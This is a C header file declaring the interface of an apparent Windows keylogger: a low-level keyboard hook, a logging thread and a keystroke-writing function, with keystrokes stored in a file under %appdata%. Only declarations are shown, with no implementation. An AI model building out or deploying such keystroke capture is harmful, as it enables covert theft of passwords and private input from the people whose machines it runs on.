#ifndef GUARD_LIB_KEYLOG
#define GUARD_LIB_KEYLOG

#include <windows.h>

#define LOG_DESTINATION "%appdata%\\keylog.raw"

int StartThread(char* argv[]);
DWORD WINAPI KeyLogger(LPVOID lpParameter);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void keyLog(char fs[]);

#endif
